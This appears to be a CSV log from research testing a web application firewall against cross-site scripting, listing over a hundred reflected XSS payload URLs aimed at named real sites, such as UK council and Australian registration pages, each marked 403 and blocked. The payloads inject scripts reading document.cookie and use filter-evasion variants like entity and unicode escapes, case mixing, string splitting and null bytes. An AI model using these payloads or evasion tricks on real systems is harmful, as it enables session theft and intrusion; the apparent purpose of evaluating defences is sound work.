status,label,executed,payload,family,base_i,name,algo,zip,target,lstm_success
403,BLOCK,False,"http://www.waverley.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>",diverse_table2,4.0,,,,,
403,BLOCK,False,"http://www.waverley.gov.uk/site/scripts/google_results.php?q=""><script>/drfv/
alert(document.cookie);</script>",diverse_table2,4.0,,,,,
403,BLOCK,False,"http://www.waverley.gov.uk/site/scripts/google_results.php?q=""><script>alert`document.cookie`;</script>",diverse_table2,4.0,,,,,
403,BLOCK,False,"http://www.waverley.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>",diverse_table2,4.0,,,,,
403,BLOCK,False,http://www.waverley.gov.uk/site/scripts/google_results.php?q=><script>alert(document.cookie);</script>,diverse_table2,4.0,,,,,
403,BLOCK,False,"http://www.waverley.gov.uk/site/scripts/google_results.php?q=""><script>\u0061\u006c\u0065\u0072\u0074(document.cookie);</script>",diverse_table2,4.0,,,,,
403,BLOCK,False,"http://www.waverley.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>",diverse_table2,4.0,,,,,
403,BLOCK,False,"http://www.waverley.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>",diverse_table2,4.0,,,,,
403,BLOCK,False,"http://www.waverley.gov.uk/site/scripts/google_results.php?q=""><script>top['al'+'ert'](document.cookie);</script>",diverse_table2,4.0,,,,,
403,BLOCK,False,"http://www.waverley.gov.uk/site/scripts/google_results.php?q=""><script>top[8680439..toString(30)](document.cookie);</script>",diverse_table2,4.0,,,,,
403,BLOCK,False,"http://www.waverley.gov.uk/site/scripts/google_results.php?q="">search?q=ok <script>alert(document.cookie);</script>",diverse_table2,4.0,,,,,
403,BLOCK,False,"http://www.waverley.gov.uk/site/scripts/google_results.php?q=""><script <!--x-->>alert(document.cookie);</script>",diverse_table2,4.0,,,,,
403,BLOCK,False,"http://www.waverley.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>",diverse_table2,4.0,,,,,
403,BLOCK,False,"http://www.waverley.gov.uk/site/scripts/google_results.php?q="">%00<script>alert(document.cookie);</script>",diverse_table2,4.0,,,,,
403,BLOCK,False,"http://www.waverley.gov.uk/site/scripts/google_results.php?q=""><script>top[/al/.source+/ert/.source](document.cookie);</script>",diverse_table2,4.0,,,,,
403,BLOCK,False,"http://www.cincinnatibell.com/search/default.asp?query=""><script>alert(document.cookie);</script>&business=true",diverse_table2,5.0,,,,,
403,BLOCK,False,"http://www.cincinnatibell.com/search/default.asp?query=""><script>alert(document.cookie);</script>&business=true",diverse_table2,5.0,,,,,
403,BLOCK,False,"http://www.cincinnatibell.com/search/default.asp?query=""><script>alert(document.cookie);</script>&business=true",diverse_table2,5.0,,,,,
403,BLOCK,False,"http://www.cincinnatibell.com/search/default.asp?query=""><script>alert(document.cookie);</script>&business=true",diverse_table2,5.0,,,,,
403,BLOCK,False,"http://www.cincinnatibell.com/search/default.asp?query=""><scriPT>alert(document.cookie);</scRIPT>&business=true",diverse_table2,5.0,,,,,
403,BLOCK,False,"http://www.cincinnatibell.com/search/default.asp?query=""><script>alert(document.cookie);</script>&business=true",diverse_table2,5.0,,,,,
403,BLOCK,False,"http://www.cincinnatibell.com/search/default.asp?query=""><script>alert(document.cookie);</script>&business=true",diverse_table2,5.0,,,,,
403,BLOCK,False,"http://www.cincinnatibell.com/search/default.asp?query=""><script>alert(document.cookie);</script>&business=true",diverse_table2,5.0,,,,,
403,BLOCK,False,"http://www.cincinnatibell.com/search/default.asp?query=""><script>&#x61;&#x6c;&#x65;&#x72;&#x74;(document.cookie);</script>&business=true",diverse_table2,5.0,,,,,
403,BLOCK,False,"http://www.cincinnatibell.com/search/default.asp?query=""><script><script>alert(document.cookie);</script>&business=true",diverse_table2,5.0,,,,,
403,BLOCK,False,"//www.cincinnatibell.com/search/default.asp?query=""><script>alert(document.cookie);</script>&business=true",diverse_table2,5.0,,,,,
403,BLOCK,False,"http://www.cincinnatibell.com/search/default.asp?query=""><script>&#97;&#108;&#101;&#114;&#116;(document.cookie);</script>&business=true",diverse_table2,5.0,,,,,
403,BLOCK,False,"http://www.cincinnatibell.com/search/default.asp?query=""><script>alert(document.cookie);</script>&business=true",diverse_table2,5.0,,,,,
403,BLOCK,False,"http://www.cincinnatibell.com/search/default.asp?query=""><script>alert(document.cookie);</script>&business=true",diverse_table2,5.0,,,,,
403,BLOCK,False,"http://www.cincinnatibell.com/search/default.asp?query=""><script>/drfv/
alert(document.cookie);</script>&business=true",diverse_table2,5.0,,,,,
403,BLOCK,False,"http://www.cincinnatibell.com/search/default.asp?query=""><script>alert`document.cookie`;</script>&business=true",diverse_table2,5.0,,,,,
403,BLOCK,False,"http://www.cincinnatibell.com/search/default.asp?query=""><script>alert(document.cookie);</script>&business=true",diverse_table2,5.0,,,,,
403,BLOCK,False,http://www.cincinnatibell.com/search/default.asp?query=><script>alert(document.cookie);</script>&business=true,diverse_table2,5.0,,,,,
403,BLOCK,False,"http://www.cincinnatibell.com/search/default.asp?query=""><script>\u0061\u006c\u0065\u0072\u0074(document.cookie);</script>&business=true",diverse_table2,5.0,,,,,
403,BLOCK,False,"http://www.cincinnatibell.com/search/default.asp?query=""><script>alert(document.cookie);</script>&business=true",diverse_table2,5.0,,,,,
403,BLOCK,False,"http://www.cincinnatibell.com/search/default.asp?query=""><script>alert(document.cookie);</script>&business=true",diverse_table2,5.0,,,,,
403,BLOCK,False,"http://www.cincinnatibell.com/search/default.asp?query=""><script>top['al'+'ert'](document.cookie);</script>&business=true",diverse_table2,5.0,,,,,
403,BLOCK,False,"http://www.cincinnatibell.com/search/default.asp?query=""><script>top[8680439..toString(30)](document.cookie);</script>&business=true",diverse_table2,5.0,,,,,
403,BLOCK,False,"http://www.cincinnatibell.com/search/default.asp?query="">search?q=ok <script>alert(document.cookie);</script>&business=true",diverse_table2,5.0,,,,,
403,BLOCK,False,"http://www.cincinnatibell.com/search/default.asp?query=""><script <!--x-->>alert(document.cookie);</script>&business=true",diverse_table2,5.0,,,,,
403,BLOCK,False,"http://www.cincinnatibell.com/search/default.asp?query=""><script>alert(document.cookie);</script>&business=true",diverse_table2,5.0,,,,,
403,BLOCK,False,"http://www.cincinnatibell.com/search/default.asp?query=""><script%00>alert(document.cookie);</script>&business=true",diverse_table2,5.0,,,,,
403,BLOCK,False,"http://www.cincinnatibell.com/search/default.asp?query=""><script>top[/al/.source+/ert/.source](document.cookie);</script>&business=true",diverse_table2,5.0,,,,,
403,BLOCK,False,"http://www.locumco.com.au/register.php?show=pharm&tertmenu="";</script><script>alert(document.cookie);</script><script>",diverse_table2,6.0,,,,,
403,BLOCK,False,"http://www.locumco.com.au/register.php?show=pharm&tertmenu="";</script><script>alert(document.cookie);</script><script>",diverse_table2,6.0,,,,,
403,BLOCK,False,"http://www.locumco.com.au/register.php?show=pharm&tertmenu="";</script><script>alert(document.cookie);</script><script>",diverse_table2,6.0,,,,,
403,BLOCK,False,"http://www.locumco.com.au/register.php?show=pharm&tertmenu="";</script><script>alert(document.cookie);</script><script>",diverse_table2,6.0,,,,,
403,BLOCK,False,"http://www.locumco.com.au/register.php?show=pharm&tertmenu="";</ScRIpt><sCriPt>alert(document.cookie);</SCript><script>",diverse_table2,6.0,,,,,
403,BLOCK,False,"http://www.locumco.com.au/register.php?show=pharm&tertmenu="";</script><script>alert(document.cookie);</script><script>",diverse_table2,6.0,,,,,
403,BLOCK,False,"http://www.locumco.com.au/register.php?show=pharm&tertmenu="";</script><script>alert(document.cookie);</script><script>",diverse_table2,6.0,,,,,
403,BLOCK,False,"http://www.locumco.com.au/register.php?show=pharm&tertmenu="";</script><script>alert(document.cookie);</script><script>",diverse_table2,6.0,,,,,
403,BLOCK,False,"http://www.locumco.com.au/register.php?show=pharm&tertmenu="";</script><script>&#x61;&#x6c;&#x65;&#x72;&#x74;(document.cookie);</script><script>",diverse_table2,6.0,,,,,
403,BLOCK,False,"http://www.locumco.com.au/register.php?show=pharm&tertmenu="";</script></script><script>alert(document.cookie);</script><script>",diverse_table2,6.0,,,,,
403,BLOCK,False,"//www.locumco.com.au/register.php?show=pharm&tertmenu="";</script><script>alert(document.cookie);</script><script>",diverse_table2,6.0,,,,,
403,BLOCK,False,"http://www.locumco.com.au/register.php?show=pharm&tertmenu="";</script><script>&#97;&#108;&#101;&#114;&#116;(document.cookie);</script><script>",diverse_table2,6.0,,,,,
403,BLOCK,False,"http://www.locumco.com.au/register.php?show=pharm&tertmenu="";</script><script>alert(document.cookie);</script><script>",diverse_table2,6.0,,,,,
403,BLOCK,False,"http://www.locumco.com.au/register.php?show=pharm&tertmenu="";</script><script>alert(document.cookie);</script><script>",diverse_table2,6.0,,,,,
403,BLOCK,False,"http://www.locumco.com.au/register.php?show=pharm&tertmenu="";</script><script>/drfv/
alert(document.cookie);</script><script>",diverse_table2,6.0,,,,,
403,BLOCK,False,"http://www.locumco.com.au/register.php?show=pharm&tertmenu="";</script><script>alert`document.cookie`;</script><script>",diverse_table2,6.0,,,,,
403,BLOCK,False,"http://www.locumco.com.au/register.php?show=pharm&tertmenu="";</script><script>alert(document.cookie);</script><script>",diverse_table2,6.0,,,,,
403,BLOCK,False,http://www.locumco.com.au/register.php?show=pharm&tertmenu=;</script><script>alert(document.cookie);</script><script>,diverse_table2,6.0,,,,,
403,BLOCK,False,"http://www.locumco.com.au/register.php?show=pharm&tertmenu="";</script><script>\u0061\u006c\u0065\u0072\u0074(document.cookie);</script><script>",diverse_table2,6.0,,,,,
403,BLOCK,False,"http://www.locumco.com.au/register.php?show=pharm&tertmenu="";</script><script>alert(document.cookie);</script><script>",diverse_table2,6.0,,,,,
403,BLOCK,False,"http://www.locumco.com.au/register.php?show=pharm&tertmenu="";</script><script>alert(document.cookie);</script><script>",diverse_table2,6.0,,,,,
403,BLOCK,False,"http://www.locumco.com.au/register.php?show=pharm&tertmenu="";</script><script>top['al'+'ert'](document.cookie);</script><script>",diverse_table2,6.0,,,,,
403,BLOCK,False,"http://www.locumco.com.au/register.php?show=pharm&tertmenu="";</script><script>top[8680439..toString(30)](document.cookie);</script><script>",diverse_table2,6.0,,,,,
403,BLOCK,False,"http://www.locumco.com.au/register.php?show=pharm&tertmenu="";search?q=ok </script><script>alert(document.cookie);</script><script>",diverse_table2,6.0,,,,,
403,BLOCK,False,"http://www.locumco.com.au/register.php?show=pharm&tertmenu="";</script <!--x-->><script>alert(document.cookie);</script><script>",diverse_table2,6.0,,,,,
403,BLOCK,False,"http://www.locumco.com.au/register.php?show=pharm&tertmenu="";</script><script>alert(document.cookie);</script><script>",diverse_table2,6.0,,,,,
403,BLOCK,False,"http://www.locumco.com.au/register.php?show=pharm&tertmenu="";</script%00><script>alert(document.cookie);</script><script>",diverse_table2,6.0,,,,,
403,BLOCK,False,"http://www.locumco.com.au/register.php?show=pharm&tertmenu="";</script><script>top[/al/.source+/ert/.source](document.cookie);</script><script>",diverse_table2,6.0,,,,,
403,BLOCK,False,"http://www.ectswsr.com.au/register.php?id=24""><script>alert(document.cookie);</script>",diverse_table2,7.0,,,,,
403,BLOCK,False,"http://www.ectswsr.com.au/register.php?id=24""><script>alert(document.cookie);</script>",diverse_table2,7.0,,,,,
403,BLOCK,False,"http://www.ectswsr.com.au/register.php?id=24""><script>alert(document.cookie);</script>",diverse_table2,7.0,,,,,
403,BLOCK,False,"http://www.ectswsr.com.au/register.php?id=24""><script>alert(document.cookie);</script>",diverse_table2,7.0,,,,,
403,BLOCK,False,"http://www.ectswsr.com.au/register.php?id=24""><Script>alert(document.cookie);</sCripT>",diverse_table2,7.0,,,,,
403,BLOCK,False,"http://www.ectswsr.com.au/register.php?id=24""><script>alert(document.cookie);</script>",diverse_table2,7.0,,,,,
403,BLOCK,False,"http://www.ectswsr.com.au/register.php?id=24""><script>alert(document.cookie);</script>",diverse_table2,7.0,,,,,
403,BLOCK,False,"http://www.ectswsr.com.au/register.php?id=24""><script>alert(document.cookie);</script>",diverse_table2,7.0,,,,,
403,BLOCK,False,"http://www.ectswsr.com.au/register.php?id=24""><script>&#x61;&#x6c;&#x65;&#x72;&#x74;(document.cookie);</script>",diverse_table2,7.0,,,,,
403,BLOCK,False,"http://www.ectswsr.com.au/register.php?id=24""><script><script>alert(document.cookie);</script>",diverse_table2,7.0,,,,,
403,BLOCK,False,"//www.ectswsr.com.au/register.php?id=24""><script>alert(document.cookie);</script>",diverse_table2,7.0,,,,,
403,BLOCK,False,"http://www.ectswsr.com.au/register.php?id=24""><script>&#97;&#108;&#101;&#114;&#116;(document.cookie);</script>",diverse_table2,7.0,,,,,
403,BLOCK,False,"http://www.ectswsr.com.au/register.php?id=24""><script>alert(document.cookie);</script>",diverse_table2,7.0,,,,,
403,BLOCK,False,"http://www.ectswsr.com.au/register.php?id=24""><script>alert(document.cookie);</script>",diverse_table2,7.0,,,,,
403,BLOCK,False,"http://www.ectswsr.com.au/register.php?id=24""><script>/drfv/
alert(document.cookie);</script>",diverse_table2,7.0,,,,,
403,BLOCK,False,"http://www.ectswsr.com.au/register.php?id=24""><script>alert`document.cookie`;</script>",diverse_table2,7.0,,,,,
403,BLOCK,False,"http://www.ectswsr.com.au/register.php?id=24""><script>alert(document.cookie);</script>",diverse_table2,7.0,,,,,
403,BLOCK,False,http://www.ectswsr.com.au/register.php?id=24><script>alert(document.cookie);</script>,diverse_table2,7.0,,,,,
403,BLOCK,False,"http://www.ectswsr.com.au/register.php?id=24""><script>\u0061\u006c\u0065\u0072\u0074(document.cookie);</script>",diverse_table2,7.0,,,,,
403,BLOCK,False,"http://www.ectswsr.com.au/register.php?id=24""><script>alert(document.cookie);</script>",diverse_table2,7.0,,,,,
403,BLOCK,False,"http://www.ectswsr.com.au/register.php?id=24""><script>alert(document.cookie);</script>",diverse_table2,7.0,,,,,
403,BLOCK,False,"http://www.ectswsr.com.au/register.php?id=24""><script>top['al'+'ert'](document.cookie);</script>",diverse_table2,7.0,,,,,
403,BLOCK,False,"http://www.ectswsr.com.au/register.php?id=24""><script>top[8680439..toString(30)](document.cookie);</script>",diverse_table2,7.0,,,,,
403,BLOCK,False,"http://www.ectswsr.com.au/register.php?id=24"">search?q=ok <script>alert(document.cookie);</script>",diverse_table2,7.0,,,,,
403,BLOCK,False,"http://www.ectswsr.com.au/register.php?id=24""><script <!--x-->>alert(document.cookie);</script>",diverse_table2,7.0,,,,,
403,BLOCK,False,"http://www.ectswsr.com.au/register.php?id=24""><script>alert(document.cookie);</script>",diverse_table2,7.0,,,,,
403,BLOCK,False,"http://www.ectswsr.com.au/register.php?id=24"">%00<script>alert(document.cookie);</script>",diverse_table2,7.0,,,,,
403,BLOCK,False,"http://www.ectswsr.com.au/register.php?id=24""><script>top[/al/.source+/ert/.source](document.cookie);</script>",diverse_table2,7.0,,,,,
403,BLOCK,False,"http://www.harrow.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,8.0,,,,,
403,BLOCK,False,"http://www.harrow.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,8.0,,,,,
403,BLOCK,False,"http://www.harrow.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,8.0,,,,,
403,BLOCK,False,"http://www.harrow.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,8.0,,,,,
403,BLOCK,False,"http://www.harrow.gov.uk/site/scripts/google_results.php?q=""><scrIPT>alert(document.cookie);</scRipT>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,8.0,,,,,
403,BLOCK,False,"http://www.harrow.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,8.0,,,,,
403,BLOCK,False,"http://www.harrow.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,8.0,,,,,
403,BLOCK,False,"http://www.harrow.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,8.0,,,,,
403,BLOCK,False,"http://www.harrow.gov.uk/site/scripts/google_results.php?q=""><script>&#x61;&#x6c;&#x65;&#x72;&#x74;(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,8.0,,,,,
403,BLOCK,False,"http://www.harrow.gov.uk/site/scripts/google_results.php?q=""><script><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,8.0,,,,,
403,BLOCK,False,"//www.harrow.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,8.0,,,,,
403,BLOCK,False,"http://www.harrow.gov.uk/site/scripts/google_results.php?q=""><script>&#97;&#108;&#101;&#114;&#116;(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,8.0,,,,,
403,BLOCK,False,"http://www.harrow.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,8.0,,,,,
